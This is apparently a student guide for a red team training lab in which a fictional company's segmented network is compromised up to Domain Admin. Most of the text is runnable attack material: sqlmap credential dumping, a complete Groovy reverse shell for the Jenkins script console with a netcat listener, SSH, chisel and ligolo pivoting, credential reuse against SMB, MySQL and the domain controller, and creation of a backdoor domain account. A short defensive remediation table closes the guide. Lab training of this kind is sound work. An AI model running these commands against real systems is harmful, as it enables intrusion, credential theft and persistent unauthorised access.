{
  "title": "Red Team Training Lab v3 - Advanced Pivoting",
  "content_type": "student_guide",
  "body_markdown": "# Red Team Training Lab v3\n\nAdvanced penetration testing with **realistic network segmentation**. Unlike v2, you must pivot through compromised hosts to reach internal systems.\n\n## Lab Overview\n\n### Your Mission\n\nYou are a penetration tester hired to assess **Acme Widgets'** security. Your goal: gain Domain Admin access starting from outside the network.\n\n**The catch:** You're on the internet segment. A firewall separates you from all internal systems. You'll need to:\n1. Find exposed services through the firewall\n2. Compromise a foothold in the DMZ\n3. Pivot through that foothold to reach internal systems\n4. Achieve domain compromise\n\n### Network Architecture\n\n```\nINTERNET (172.16.0.0/24)          DMZ (172.16.1.0/24)           INTERNAL (172.16.2.0/24)\n├── kali (.10) ← You              ├── webserver (.10)           ├── fileserver (.10)\n├── firewall (.1)                 ├── jumpbox (.20)             ├── ws01 (.11)\n└── vpn (.50)                     ├── ftp (.30)                 ├── dc01 (.12)\n                                  └── jenkins (.40)             ├── wiki (.20)\n                                                                ├── ticketing (.30)\n                                                                └── db01 (.40)\n```\n\n### Firewall NAT Rules\n\nThe firewall exposes these services to the internet:\n- `172.16.0.100:80` → Webserver (WordPress)\n- `172.16.0.100:8080` → Jenkins CI/CD\n- `172.16.0.50:1194` → VPN (OpenVPN)\n\n### Multiple Attack Paths\n\nThis lab supports multiple approaches:\n\n| Path | Entry Point | Difficulty | Skills Practiced |\n|------|-------------|------------|------------------|\n| **SQLi → Pivot** | Webserver | Medium | SQLi, SSH tunneling, lateral movement |\n| **Jenkins RCE** | Jenkins | Medium | Web app exploitation, reverse shells |\n| **VPN Access** | VPN Gateway | Easy | Credential stuffing, network access |\n| **Combined** | Multiple | Hard | All of the above |\n\nChoose your own adventure!\n\n\n## Phase 1: Reconnaissance\n\n### Scan the Internet Segment\n\nStart by discovering what's reachable from your position.\n\n```bash\n# Quick scan of internet segment\nnmap -sn 172.16.0.0/24\n```\n\n**Expected hosts:**\n- `172.16.0.1` - Firewall (gateway)\n- `172.16.0.10` - Your Kali box\n- `172.16.0.50` - VPN server\n- `172.16.0.100` - NAT'd services (webserver, jenkins)\n\n### Enumerate Exposed Services\n\n```bash\n# Full port scan on NAT IP\nnmap -sV -sC -p- 172.16.0.100\n\n# VPN server\nnmap -sV -sU -p 1194 172.16.0.50\n```\n\n**Expected results on 172.16.0.100:**\n\n| Port | Service | Notes |\n|------|---------|-------|\n| 80 | HTTP | WordPress site |\n| 8080 | HTTP | Jenkins CI/CD |\n\n### Web Application Recon\n\n```bash\n# Check WordPress\ncurl -s http://172.16.0.100 | head -20\n\n# Check Jenkins\ncurl -s http://172.16.0.100:8080 | head -20\n\n# Directory enumeration on WordPress\ngobuster dir -u http://172.16.0.100 -w /usr/share/wordlists/dirb/common.txt\n```\n\n**Key findings to look for:**\n- `/employees/` - Employee directory (SQLi target)\n- `/wp-admin/` - WordPress admin\n- Jenkins dashboard accessible\n\n\n## Phase 2: Initial Access Options\n\nYou have multiple ways to get a foothold. Choose one or try them all!\n\n### Option A: SQL Injection on WordPress (Primary Path)\n\nThe employee directory has a SQL injection vulnerability.\n\n#### Find the Vulnerability\n\n```bash\n# Browse to employee directory\ncurl -s \"http://172.16.0.100/employees/\"\n\n# Test for SQLi with boolean conditions\ncurl -s \"http://172.16.0.100/employees/?employee_id=1\" | grep -o 'Notes:</strong>[^<]*'\ncurl -s \"http://172.16.0.100/employees/?employee_id=1%20AND%201=1\" | grep -o 'Notes:</strong>[^<]*'\ncurl -s \"http://172.16.0.100/employees/?employee_id=1%20AND%201=2\" | grep -o 'Notes:</strong>[^<]*'\n```\n\nDifferent responses confirm SQLi!\n\n#### Extract Credentials with SQLMap\n\n```bash\n# Confirm vulnerability\nsqlmap -u \"http://172.16.0.100/employees/?employee_id=1\" -p employee_id --batch\n\n# List databases\nsqlmap -u \"http://172.16.0.100/employees/?employee_id=1\" -p employee_id --dbs --batch\n\n# Dump employee table\nsqlmap -u \"http://172.16.0.100/employees/?employee_id=1\" -p employee_id -D wordpress -T wp_acme_employees --dump --batch\n```\n\n**Extracted credentials:**\n\n| Username | Password | Notes |\n|----------|----------|-------|\n| jsmith | Summer2024 | IT admin |\n| mwilliams | Welcome123 | New employee |\n| svc_backup | Backup2024 | Service account |\n\n#### Get Shell Access on Webserver\n\nThe webserver has SSH enabled. Try the extracted credentials:\n\n```bash\n# Test SSH access with extracted creds\nssh svc_backup@172.16.0.100\n# Password: Backup2024\n```\n\nWait - that's the NAT IP! The SSH port isn't forwarded. But now we know creds that might work elsewhere...\n\n**Key insight:** The SQLi gives us credentials, but we need another way to use them. Let's check if there's SSH on the webserver's actual IP once we can reach it.\n\n\n### Option B: Jenkins Script Console (Alternative)\n\nJenkins has a Groovy script console that allows code execution.\n\n```bash\n# Access Jenkins\nfirefox http://172.16.0.100:8080 &\n```\n\n#### Login to Jenkins\n\nTry default/weak credentials:\n- `admin:admin` ← This works!\n- `developer:Dev2024!`\n\n#### Execute Groovy Reverse Shell\n\n1. Navigate to: `Manage Jenkins` → `Script Console`\n2. Execute this Groovy script:\n\n```groovy\n// Reverse shell to your Kali box\nString host = \"172.16.0.10\";\nint port = 4444;\nString cmd = \"/bin/bash\";\nProcess p = new ProcessBuilder(cmd).redirectErrorStream(true).start();\nSocket s = new Socket(host, port);\nInputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\nOutputStream po = p.getOutputStream(), so = s.getOutputStream();\nwhile(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();\n```\n\n3. Set up listener on Kali first:\n\n```bash\nnc -lvnp 4444\n```\n\n**Now you have a shell on the Jenkins server (172.16.1.40)!**\n\n\n### Option C: VPN Credential Stuffing (Easiest)\n\nThe VPN accepts username/password authentication. Try credentials from SQLi:\n\n```bash\n# The VPN config would normally be downloaded, but we can test auth\n# These credentials work: jsmith / Summer2024\n\n# If you have OpenVPN config:\nopenvpn --config client.ovpn --auth-user-pass\n```\n\nOnce connected via VPN, you're directly on the internal network (10.8.0.x) with routes to 172.16.2.0/24!\n\nThis is the **fastest path** to internal access, but you miss learning pivoting skills.\n\n\n## Phase 3: Pivoting Fundamentals\n\nAssuming you went with **Option A** (SQLi), you have credentials but no direct access to internal systems. Time to learn pivoting!\n\n### Understanding the Network\n\nFrom Kali, you can only reach:\n- 172.16.0.0/24 (internet segment)\n- NAT'd services on 172.16.0.100\n\nTo reach DMZ (172.16.1.0/24) or Internal (172.16.2.0/24), you need to:\n1. Compromise a host that spans networks\n2. Route your traffic through that host\n\n### SSH Tunneling Basics\n\nSSH tunnels let you forward traffic through an SSH connection.\n\n#### Local Port Forwarding\n\nForward a local port to a remote destination through the SSH server:\n\n```bash\nssh -L [local_port]:[destination]:[dest_port] user@ssh_server\n```\n\n**Example:** Access internal wiki (172.16.2.20:80) through webserver:\n\n```bash\nssh -L 8080:172.16.2.20:80 svc_backup@172.16.1.10\n# Then browse to http://localhost:8080\n```\n\n#### Dynamic Port Forwarding (SOCKS Proxy)\n\nCreate a SOCKS proxy that routes ALL traffic through the SSH server:\n\n```bash\nssh -D [local_port] user@ssh_server\n```\n\n**Example:** SOCKS proxy through webserver:\n\n```bash\nssh -D 9050 svc_backup@172.16.1.10\n# Now configure tools to use SOCKS5 proxy on localhost:9050\n```\n\n#### Remote Port Forwarding\n\nExpose a local port on the remote server (useful for reverse shells):\n\n```bash\nssh -R [remote_port]:localhost:[local_port] user@ssh_server\n```\n\n\n## Phase 4: Establishing Your Pivot\n\n### Step 1: Get Access to a DMZ Host\n\nFirst, we need to reach a DMZ host. The webserver's SSH isn't directly exposed, but **Jenkins is on the DMZ**.\n\nIf you got a shell via Jenkins (Option B), you're already in the DMZ!\n\nIf you only have credentials from SQLi, we need another approach...\n\n#### Using the Firewall's Allowed Flows\n\nThe firewall allows certain traffic. Let's find what we can reach:\n\n```bash\n# The NAT on port 80 forwards to webserver\n# Can we interact beyond HTTP?\n\n# Check if webserver has SSH exposed via different NAT\nnmap -p 22 172.16.0.100\n```\n\nNo SSH on the NAT IP. But wait - the webserver might have a web shell or command injection...\n\n#### Webserver PHP Shell\n\nLet's check if we can upload a shell to WordPress:\n\n```bash\n# Try to access wp-admin with extracted creds\n# Some WordPress users might have weak passwords\n```\n\nAlternatively, use the Jenkins shell you got earlier to pivot!\n\n### Step 2: From Jenkins to DMZ Exploration\n\nFrom your Jenkins shell:\n\n```bash\n# Check what network we're on\nip addr show\n# Should show 172.16.1.40\n\n# Scan the DMZ\nfor i in $(seq 1 50); do ping -c 1 -W 1 172.16.1.$i 2>/dev/null | grep \"bytes from\" & done; wait\n```\n\n**DMZ hosts discovered:**\n- 172.16.1.1 - Firewall\n- 172.16.1.10 - Webserver\n- 172.16.1.20 - Jumpbox\n- 172.16.1.30 - FTP\n- 172.16.1.40 - Jenkins (you are here)\n\n### Step 3: Test Credentials on DMZ Hosts\n\n```bash\n# From Jenkins shell, try SSH to webserver\nssh svc_backup@172.16.1.10\n# Password: Backup2024\n```\n\n**Success!** The SQLi credentials work on the webserver.\n\n### Step 4: Set Up Persistent Pivot\n\nNow set up an SSH tunnel from Kali through Jenkins to enable easier access:\n\n**On Kali, set up a reverse tunnel:**\n\n```bash\n# First, start SSH server on Kali if needed\nsudo systemctl start ssh\n\n# From Jenkins shell, connect back to Kali with reverse tunnel\nssh -R 2222:172.16.1.10:22 kali@172.16.0.10\n```\n\nNow from Kali:\n```bash\nssh -p 2222 svc_backup@localhost\n# You're on the webserver!\n```\n\n### Step 5: Set Up SOCKS Proxy\n\nFor easier access to all internal systems, create a SOCKS proxy:\n\n```bash\n# From Kali, through Jenkins reverse tunnel, to webserver\n# Then webserver can reach internal network\n\n# If you have direct SSH to webserver (via tunnel):\nssh -D 9050 -p 2222 svc_backup@localhost\n```\n\nOr use **Chisel** for a cleaner setup:\n\n```bash\n# On Kali (server mode)\nchisel server -p 8000 --reverse\n\n# On compromised host (client mode)\nchisel client 172.16.0.10:8000 R:socks\n```\n\n\n## Phase 5: Using Proxychains\n\n### Configure Proxychains\n\nEdit `/etc/proxychains4.conf`:\n\n```bash\nsudo nano /etc/proxychains4.conf\n```\n\nAt the bottom, set your proxy:\n\n```\n[ProxyList]\nsocks5 127.0.0.1 9050\n```\n\n### Scan Through the Proxy\n\n```bash\n# Scan internal network through your pivot\nproxychains nmap -sT -Pn 172.16.2.0/24 -p 22,80,443,445,3306\n\n# Or scan specific hosts\nproxychains nmap -sT -Pn 172.16.2.10-20 -p 22,80,445,389\n```\n\n**Note:** Proxychains only works with TCP. Use `-sT` for connect scans.\n\n### Access Services Through Proxy\n\n```bash\n# Browse internal wiki\nproxychains curl http://172.16.2.20\n\n# Access SMB shares\nproxychains smbclient -L //172.16.2.10 -U 'svc_backup%Backup2024'\n\n# Connect to MySQL\nproxychains mysql -h 172.16.2.40 -u root -p\n```\n\n\n## Phase 6: Internal Network Enumeration\n\n### Scan Internal Network\n\n```bash\n# Through your proxy\nproxychains nmap -sT -Pn 172.16.2.0/24\n```\n\n**Internal hosts:**\n\n| IP | Hostname | Services |\n|----|----------|----------|\n| 172.16.2.1 | firewall | - |\n| 172.16.2.10 | fileserver | SMB (445) |\n| 172.16.2.11 | ws01 | Workstation |\n| 172.16.2.12 | dc01 | LDAP (389), SMB (445) |\n| 172.16.2.20 | wiki | HTTP (80) |\n| 172.16.2.30 | ticketing | HTTP (80) |\n| 172.16.2.40 | db01 | MySQL (3306) |\n| 172.16.2.50 | vpn | - |\n\n### Enumerate Each Service\n\n#### Internal Wiki (172.16.2.20)\n\n```bash\nproxychains curl -s http://172.16.2.20 | head -50\n\n# Browse the wiki for sensitive info\nproxychains curl -s http://172.16.2.20/doku.php?id=it:services\nproxychains curl -s http://172.16.2.20/doku.php?id=it:network\n```\n\n**Wiki goldmine!** Check the IT services page for:\n- Service account credentials\n- Emergency admin passwords\n- Network documentation\n\n#### Ticketing System (172.16.2.30)\n\n```bash\nproxychains curl -s http://172.16.2.30\n```\n\n**Tickets reveal:**\n- Password reset requests with creds in comments\n- Service account info\n- Security audit findings (unpatched vulnerabilities!)\n\n#### MySQL Database (172.16.2.40)\n\n```bash\n# Try root with common passwords\nproxychains mysql -h 172.16.2.40 -u root -pDBr00t2024!\n```\n\n```sql\n-- Once connected\nSHOW DATABASES;\nUSE internal_data;\nSHOW TABLES;\nSELECT * FROM employee_credentials;\nSELECT * FROM servers;\n```\n\n**Database contains:**\n- Employee credentials table\n- Server inventory with admin passwords\n\n#### File Server (172.16.2.10)\n\n```bash\n# List shares\nproxychains smbclient -L //172.16.2.10 -U 'svc_backup%Backup2024'\n\n# Access sensitive share\nproxychains smbclient //172.16.2.10/sensitive -U 'svc_backup%Backup2024'\n```\n\n```\nsmb: \\> ls\nsmb: \\> get passwords.txt\nsmb: \\> exit\n```\n\n**passwords.txt contains the Domain Admin password!**\n\n\n## Phase 7: Domain Compromise\n\n### Verify Domain Admin Credentials\n\nFrom wiki, ticketing, database, or fileserver, you should have found:\n- **Administrator / Adm1n2024**\n\n```bash\n# Test against DC\nproxychains smbclient -L //172.16.2.12 -U 'Administrator%Adm1n2024'\n\n# Or use rpcclient\nproxychains rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'getusername'\n```\n\n**Success!** You're Domain Admin.\n\n### Enumerate the Domain\n\n```bash\n# List all users\nproxychains rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'enumdomusers'\n\n# List groups\nproxychains rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'enumdomgroups'\n\n# Who's in Domain Admins?\nproxychains rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'querygroupmem 512'\n```\n\n### Create Persistence\n\n```bash\n# Create a backdoor account\nproxychains net rpc user add support 'P@ssw0rd123!' -U 'Administrator%Adm1n2024' -S 172.16.2.12\n\n# Verify it works\nproxychains smbclient -L //172.16.2.12 -U 'support%P@ssw0rd123!'\n```\n\n### LDAP Deep Dive\n\n```bash\n# Export all users\nproxychains ldapsearch -x -H ldap://172.16.2.12 -ZZ \\\n  -D \"cn=Administrator,cn=Users,DC=acmewidgets,DC=local\" \\\n  -w 'Adm1n2024' \\\n  -b 'DC=acmewidgets,DC=local' \\\n  '(objectClass=user)' sAMAccountName description memberOf\n```\n\n\n## Phase 8: Alternative Attack Paths\n\n### Path: FTP Information Gathering\n\nThe DMZ FTP server has useful intel:\n\n```bash\n# From your pivot, access FTP\nproxychains ftp 172.16.1.30\n# Login: anonymous (no password)\n```\n\n```\nftp> ls\nftp> cd public\nftp> get network-diagram.txt\nftp> cd ../backups\nftp> get old-passwords.txt\nftp> bye\n```\n\n**old-passwords.txt** might have reusable credentials!\n\n### Path: Jumpbox as Pivot\n\nThe jumpbox has direct access to internal network:\n\n```bash\n# If you can SSH to jumpbox (need creds)\nproxychains ssh admin@172.16.1.20\n# Password: JumpB0x2024!\n\n# From jumpbox, you have direct internal access\nssh svc_backup@172.16.2.10\n```\n\n### Path: Direct Database Exploitation\n\nIf you found MySQL credentials early:\n\n```bash\n# Connect to internal MySQL from DMZ\nproxychains mysql -h 172.16.2.40 -u root -pDBr00t2024!\n\n# The database has everything!\nSELECT * FROM internal_data.employee_credentials;\nSELECT * FROM internal_data.servers;\n```\n\n### Path: Chained Pivots\n\nFor maximum stealth, chain multiple pivots:\n\n```\nKali → Jenkins → Webserver → Jumpbox → Internal\n```\n\nEach hop adds a layer of indirection:\n\n```bash\n# Pivot 1: Kali to Jenkins (reverse shell or tunnel)\n# Pivot 2: Jenkins to Webserver\nssh -D 1080 svc_backup@172.16.1.10\n\n# Pivot 3: Through webserver to jumpbox\n# Edit proxychains.conf for chain:\n# socks5 127.0.0.1 9050   # to webserver\n# Then from webserver:\nssh -D 1081 admin@172.16.1.20\n```\n\n\n## Credential Summary\n\nAll credentials discoverable in this lab:\n\n| Source | Username | Password | Access |\n|--------|----------|----------|--------|\n| SQLi | jsmith | Summer2024 | VPN, various |\n| SQLi | mwilliams | Welcome123 | VPN |\n| SQLi | svc_backup | Backup2024 | SMB, SSH |\n| Jenkins | admin | admin | Jenkins admin |\n| Jumpbox | admin | JumpB0x2024! | Jumpbox sudo |\n| FTP | anonymous | (none) | Public files |\n| FTP | ftpuser | Ftp2024! | Upload access |\n| Wiki | - | Adm1n2024 | Domain Admin |\n| Ticketing | - | various | Exposed in tickets |\n| MySQL | root | DBr00t2024! | Full DB access |\n| Fileserver | - | Adm1n2024 | In passwords.txt |\n\n\n## Tools Reference\n\n### SSH Tunneling\n\n```bash\n# Local forward\nssh -L 8080:internal_host:80 user@pivot\n\n# Dynamic SOCKS proxy\nssh -D 9050 user@pivot\n\n# Remote forward (reverse)\nssh -R 4444:localhost:4444 user@pivot\n\n# Keep tunnel alive\nssh -D 9050 -N -f user@pivot\n```\n\n### Chisel\n\n```bash\n# Server (on Kali)\nchisel server -p 8000 --reverse\n\n# Client (on compromised host)\nchisel client KALI_IP:8000 R:socks\n```\n\n### Proxychains\n\n```bash\n# Config: /etc/proxychains4.conf\n# Add: socks5 127.0.0.1 9050\n\n# Usage\nproxychains nmap -sT -Pn TARGET\nproxychains curl http://TARGET\nproxychains smbclient //TARGET/share -U 'user%pass'\n```\n\n### Ligolo-ng (Advanced)\n\n```bash\n# Proxy (on Kali)\nligolo-proxy -selfcert\n\n# Agent (on compromised host)\nligolo-agent -connect KALI_IP:11601 -ignore-cert\n\n# In ligolo console:\n» session\n» ifconfig\n» start\n\n# Add route on Kali\nsudo ip route add 172.16.2.0/24 dev ligolo\n```\n\n\n## Attack Chain Summary\n\n```\n┌─────────────────────────────────────────────────────────────────────────┐\n│                         ATTACK PATHS OVERVIEW                            │\n└─────────────────────────────────────────────────────────────────────────┘\n\n  PATH A: SQLi → Pivot → Domain\n  ────────────────────────────\n  1. SQLi on WordPress → Extract credentials\n  2. Jenkins RCE → Get DMZ foothold\n  3. SSH to webserver with stolen creds\n  4. SOCKS proxy through webserver\n  5. Enumerate internal via proxy\n  6. Find Domain Admin in wiki/fileserver\n  7. Authenticate to DC → Game over\n\n  PATH B: Jenkins → Direct Pivot\n  ──────────────────────────────\n  1. Jenkins admin:admin → Script console\n  2. Groovy reverse shell → DMZ access\n  3. Explore DMZ → Find jumpbox creds\n  4. Jumpbox → Direct internal access\n  5. Domain compromise\n\n  PATH C: VPN Shortcut\n  ────────────────────\n  1. SQLi → Extract jsmith creds\n  2. VPN connect with jsmith/Summer2024\n  3. Direct internal network access\n  4. Skip all pivoting!\n  5. Domain compromise\n\n  PATH D: Information Gathering\n  ─────────────────────────────\n  1. FTP anonymous → Network diagram, old passwords\n  2. Wiki → IT documentation with all creds\n  3. Ticketing → Password reset tickets\n  4. MySQL → employee_credentials table\n  5. Multiple credential sources → Pick your target\n\n┌─────────────────────────────────────────────────────────────────────────┐\n│  All paths lead to: Administrator / Adm1n2024 → Domain Admin            │\n└─────────────────────────────────────────────────────────────────────────┘\n```\n\n\n## Mission Complete!\n\nCongratulations! You've completed the Red Team Training Lab v3.\n\n### Skills Demonstrated\n\n- [x] Network reconnaissance through firewalls\n- [x] SQL injection exploitation\n- [x] SSH tunneling (local, dynamic, remote)\n- [x] SOCKS proxy configuration\n- [x] Proxychains usage\n- [x] Multi-hop pivoting\n- [x] Credential harvesting from multiple sources\n- [x] Active Directory enumeration\n- [x] Lateral movement techniques\n- [x] Persistence establishment\n\n### Defensive Takeaways\n\n| Vulnerability | Remediation |\n|---------------|-------------|\n| SQL Injection | Parameterized queries, WAF |\n| Weak Jenkins password | Strong passwords, SSO |\n| Credentials in wiki | Secrets manager (Vault) |\n| Credentials in tickets | Redact sensitive data |\n| Password reuse | Unique passwords + MFA |\n| Weak MySQL root | Strong passwords, network ACLs |\n| VPN credential stuffing | MFA on VPN |\n| Plaintext passwords in files | Encryption at rest, access controls |\n\n### Next Steps\n\n1. Try completing via a different attack path\n2. Time yourself - can you get DA in under 30 minutes?\n3. Document your findings as a professional pentest report\n4. Practice the blue team perspective - how would you detect these attacks?\n"
}
